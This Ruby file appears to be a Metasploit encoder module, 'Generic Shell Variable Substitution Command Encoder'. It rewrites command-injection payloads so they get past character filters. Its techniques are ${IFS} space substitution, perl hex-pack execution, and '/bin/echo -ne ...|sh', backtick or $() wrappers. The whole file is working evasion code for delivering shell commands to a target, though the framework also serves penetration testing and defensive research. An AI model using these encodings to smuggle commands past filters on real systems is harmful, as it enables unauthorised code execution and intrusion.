##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Encoder

  # Has some issues, but overall it's pretty good
  Rank = ManualRanking

  def initialize
    super(
      'Name' => 'Generic Shell Variable Substitution Command Encoder',
      'Description' => %q{
        This encoder uses standard Bourne shell variable substitution
      tricks to avoid commonly restricted characters.
      },
      'Author' => 'hdm',
      'Arch' => ARCH_CMD,
      'Platform' => 'unix')
  end

  #
  # Encodes the payload
  #
  def encode_block(state, buf)
    # Skip encoding for empty badchars
    if state.badchars.empty?
      return buf
    end

    if state.badchars.include?('-')
      # Then neither of the others will work.  Get rid of spaces and hope
      # for the best.  This obviously won't work if the command already
      # has other badchars in it, in which case we're basically screwed.
      if state.badchars.include?(' ')
        buf.gsub!(/\s/, '${IFS}')
      end
    elsif state.badchars.include?('\\')
      # Without an escape character we can't escape anything, so echo
      # won't work.  Try perl.
      buf = encode_block_perl(state, buf)
    else
      buf = encode_block_bash_echo(state, buf)
    end

    return buf
  end

  #
  # Uses the perl command to hex encode the command string
  #
  def encode_block_perl(state, buf)
    hex = buf.unpack('H*')
    cmd = 'perl -e '
    qot = ',-:.=+!@#$%^&'

    # Find a quoting character to use
    state.badchars.unpack('C*') { |c| qot.delete(c.chr) }

    # Throw an error if we ran out of quotes
    raise EncodingError if qot.empty?

    sep = qot[0].chr

    # Convert spaces to IFS...
    if state.badchars.include?(' ')
      cmd.gsub!(/\s/, '${IFS}')
    end

    # Can we use single quotes to enclose the command string?
    if state.badchars.include?("'")

      if state.badchars.match(/\(|\)/)

        # No parenthesis...
        raise EncodingError
      end

      cmd << "system\\(pack\\(qq#{sep}H\\*#{sep},qq#{sep}#{hex}#{sep}\\)\\)"

    elsif state.badchars.match(/\(|\)/)
      if state.badchars.include?(' ')
        # No spaces allowed, no parenthesis, give up...
        raise EncodingError
      end

      cmd << "'system pack qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}'"
    else
      cmd << "'system(pack(qq#{sep}H*#{sep},qq#{sep}#{hex}#{sep}))'"
    end

    return cmd
  end

  #
  # Uses bash's echo -ne command to hex encode the command string
  #
  def encode_block_bash_echo(state, buf)
    hex = ''

    # Can we use single quotes to enclose the echo arguments?
    if state.badchars.include?("'")
      hex = buf.unpack('C*').collect { |c| '\\\\\\x%.2x' % c }.join
    else
      hex = "'" + buf.unpack('C*').collect { |c| '\\x%.2x' % c }.join + "'"
    end

    # Are pipe characters restricted?
    if state.badchars.include?('|')
      # How about backticks?
      if state.badchars.include?('`')
        # Last ditch effort, dollar paren
        if state.badchars.include?('$') || state.badchars.include?('(')
          raise EncodingError
        else
          buf = "$(/bin/echo -ne #{hex})"
        end
      else
        buf = "`/bin/echo -ne #{hex}`"
      end
    else
      buf = "/bin/echo -ne #{hex}|sh"
    end

    # Remove spaces from the command string
    if state.badchars.include?(' ')
      buf.gsub!(/\s/, '${IFS}')
    end

    return buf
  end
end
